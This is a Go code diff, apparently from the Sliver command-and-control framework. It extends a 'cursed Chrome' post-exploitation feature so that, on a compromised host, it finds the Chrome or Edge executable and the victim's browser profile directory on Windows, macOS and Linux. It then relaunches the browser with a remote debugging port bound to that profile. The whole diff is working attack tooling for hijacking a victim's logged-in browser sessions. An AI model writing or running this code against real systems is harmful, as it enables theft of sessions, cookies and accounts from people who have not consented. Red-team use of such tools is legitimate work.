@@ -145,7 +145,7 @@ func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *co
 			return nil
 		}
 	}
-	curse, err := startCursedChromeProcess(true, session, ctx, con)
+	curse, err := startCursedChromeProcess(false, session, ctx, con)
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return nil
@@ -153,29 +153,36 @@ func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *co
 	return curse
 }
 
-func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*core.CursedProcess, error) {
-	con.PrintInfof("Finding Chrome executable path ... ")
-	chromeExePath, err := findChromeExecutablePath(session, ctx, con)
+func startCursedChromeProcess(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*core.CursedProcess, error) {
+	name := "Chrome"
+	if isEdge {
+		name = "Edge"
+	}
+
+	con.PrintInfof("Finding %s executable path ... ", name)
+	chromeExePath, err := findChromeExecutablePath(isEdge, session, ctx, con)
 	if err != nil {
 		con.Printf("failure!\n")
 		return nil, err
 	}
 	con.Printf("success!\n")
-	con.PrintInfof("Finding Chrome user data directory ... ")
-	chromeUserDataDir, err := findChromeUserDataDir(session, ctx, con)
+	con.PrintInfof("Finding %s user data directory ... ", name)
+	chromeUserDataDir, err := findChromeUserDataDir(isEdge, session, ctx, con)
 	if err != nil {
 		con.Printf("failure!\n")
 		return nil, err
 	}
 	con.Printf("success!\n")
 
-	con.PrintInfof("Starting Chrome process ... ")
+	con.PrintInfof("Starting %s process ... ", name)
 	debugPort := uint16(ctx.Flags.Int("remote-debugging-port"))
 	args := []string{
 		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
 	}
-	if restore {
+	if chromeUserDataDir != "" {
 		args = append(args, fmt.Sprintf("--user-data-dir=%s", chromeUserDataDir))
+	}
+	if ctx.Flags.Bool("restore") {
 		args = append(args, "--restore-last-session")
 	}
 
@@ -193,7 +200,7 @@ func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grum
 	}
 	con.Printf("(pid: %d) success!\n", chromeExec.GetPid())
 
-	con.PrintInfof("Waiting for Chrome process to initialize ... ")
+	con.PrintInfof("Waiting for %s process to initialize ... ", name)
 	time.Sleep(2 * time.Second)
 
 	bindPort := insecureRand.Intn(10000) + 40000
@@ -236,11 +243,160 @@ func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grum
 	return curse, nil
 }
 
+func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
+	userDataFlag := ctx.Flags.String("user-data")
+	if userDataFlag != "" {
+		return userDataFlag, nil
+	}
+
+	switch session.GetOS() {
+
+	case "windows":
+		username := session.GetUsername()
+		if strings.Contains(username, "\\") {
+			username = strings.Split(username, "\\")[1]
+		}
+		for _, driveLetter := range windowsDriveLetters {
+			userDataDir := fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", driveLetter, username)
+			if isEdge {
+				userDataDir = fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data", driveLetter, username)
+			}
+			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+				Request: con.ActiveTarget.Request(ctx),
+				Path:    userDataDir,
+			})
+			if err != nil {
+				return "", err
+			}
+			if ls.GetExists() {
+				return userDataDir, nil
+			}
+		}
+		return "", ErrUserDataDirNotFound
+
+	case "darwin":
+		userDataDir := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome", session.Username)
+		if isEdge {
+			userDataDir = fmt.Sprintf("/Users/%s/Library/Application Support/Microsoft Edge", session.Username)
+		}
+		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+			Request: con.ActiveTarget.Request(ctx),
+			Path:    userDataDir,
+		})
+		if err != nil {
+			return "", err
+		}
+		if ls.GetExists() {
+			return userDataDir, nil
+		}
+		return "", ErrUserDataDirNotFound
+
+	default:
+		return "", ErrUnsupportedOS
+	}
+}
+
+func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
+	exeFlag := ctx.Flags.String("exe")
+	if exeFlag != "" {
+		return exeFlag, nil
+	}
+
+	switch session.GetOS() {
+
+	case "windows":
+		chromeWindowsPaths := []string{
+			"[DRIVE]:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
+			"[DRIVE]:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+			"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe",
+			"[DRIVE]:\\Program Files (x86)\\Google\\Application\\chrome.exe",
+		}
+		if isEdge {
+			chromeWindowsPaths = []string{
+				"[DRIVE]:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+				"[DRIVE]:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+				"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe",
+			}
+		}
+		username := session.GetUsername()
+		if strings.Contains(username, "\\") {
+			username = strings.Split(username, "\\")[1]
+		}
+		for _, driveLetter := range windowsDriveLetters {
+			for _, chromePath := range chromeWindowsPaths {
+				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", driveLetter)
+				chromeExecutablePath = strings.ReplaceAll(chromeExecutablePath, "[USERNAME]", username)
+				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+					Request: con.ActiveTarget.Request(ctx),
+					Path:    chromeExecutablePath,
+				})
+				if err != nil {
+					return "", err
+				}
+				if ls.GetExists() {
+					return chromeExecutablePath, nil
+				}
+			}
+		}
+		return "", ErrChromeExecutableNotFound
+
+	case "darwin":
+		// AFAIK Chrome only installs to this path on macOS
+		defaultChromePath := "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+		if isEdge {
+			defaultChromePath = "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
+		}
+		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+			Request: con.ActiveTarget.Request(ctx),
+			Path:    defaultChromePath,
+		})
+		if err != nil {
+			return "", err
+		}
+		if ls.GetExists() {
+			return defaultChromePath, nil
+		}
+		return "", ErrChromeExecutableNotFound
+
+	case "linux":
+		chromeLinuxPaths := []string{
+			"/usr/bin/google-chrome",
+			"/usr/bin/chromium-browser",
+			"/usr/local/bin/google-chrome",
+			"/usr/local/bin/chromium-browser",
+		}
+		if isEdge {
+			chromeLinuxPaths = []string{
+				"/usr/bin/microsoft-edge",
+				"/usr/local/bin/microsoft-edge",
+			}
+		}
+		for _, chromePath := range chromeLinuxPaths {
+			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+				Request: con.ActiveTarget.Request(ctx),
+				Path:    chromePath,
+			})
+			if err != nil {
+				return "", err
+			}
+			if ls.GetExists() {
+				return chromePath, nil
+			}
+		}
+		return "", ErrChromeExecutableNotFound
+
+	default:
+		return "", ErrUnsupportedOS
+	}
+}
+
 func isChromeProcess(executable string) bool {
 	var chromeProcessNames = []string{
-		"chrome",        // Linux
-		"chrome.exe",    // Windows
-		"Google Chrome", // Darwin
+		"chrome",           // Linux
+		"google-chrome",    // Linux
+		"chromium-browser", // Linux
+		"chrome.exe",       // Windows
+		"Google Chrome",    // Darwin
 	}
 	for _, suffix := range chromeProcessNames {
 		if strings.HasSuffix(executable, suffix) {
@@ -266,97 +422,4 @@ func getChromeProcess(session *clientpb.Session, ctx *grumble.Context, con *cons
 		}
 	}
 	return nil, nil
-}
-
-func findChromeUserDataDir(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
-	switch session.GetOS() {
-
-	case "windows":
-		username := session.GetUsername()
-		if strings.Contains(username, "\\") {
-			username = strings.Split(username, "\\")[1]
-		}
-		for _, driveLetter := range windowsDriveLetters {
-			userDataDir := fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", driveLetter, username)
-			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-				Request: con.ActiveTarget.Request(ctx),
-				Path:    userDataDir,
-			})
-			if err != nil {
-				return "", err
-			}
-			if ls.GetExists() {
-				return userDataDir, nil
-			}
-		}
-		return "", ErrUserDataDirNotFound
-
-	case "darwin":
-		userDataDir := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome", session.Username)
-		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-			Request: con.ActiveTarget.Request(ctx),
-			Path:    userDataDir,
-		})
-		if err != nil {
-			return "", err
-		}
-		if ls.GetExists() {
-			return userDataDir, nil
-		}
-		return "", ErrUserDataDirNotFound
-
-	default:
-		return "", ErrUnsupportedOS
-	}
-}
-
-func findChromeExecutablePath(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
-	switch session.GetOS() {
-
-	case "windows":
-		chromePaths := []string{
-			"[DRIVE]:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
-			"[DRIVE]:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
-			"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe",
-			"[DRIVE]:\\Program Files (x86)\\Google\\Application\\chrome.exe",
-		}
-		username := session.GetUsername()
-		if strings.Contains(username, "\\") {
-			username = strings.Split(username, "\\")[1]
-		}
-		for _, driveLetter := range windowsDriveLetters {
-			for _, chromePath := range chromePaths {
-				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", driveLetter)
-				chromeExecutablePath = strings.ReplaceAll(chromeExecutablePath, "[USERNAME]", username)
-				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-					Request: con.ActiveTarget.Request(ctx),
-					Path:    chromeExecutablePath,
-				})
-				if err != nil {
-					return "", err
-				}
-				if ls.GetExists() {
-					return chromeExecutablePath, nil
-				}
-			}
-		}
-		return "", ErrChromeExecutableNotFound
-
-	case "darwin":
-		const defaultChromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
-		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-			Request: con.ActiveTarget.Request(ctx),
-			Path:    defaultChromePath,
-		})
-		if err != nil {
-			return "", err
-		}
-		if ls.GetExists() {
-			return defaultChromePath, nil
-		}
-		return "", ErrChromeExecutableNotFound
-
-	default:
-		return "", ErrUnsupportedOS
-	}
 }
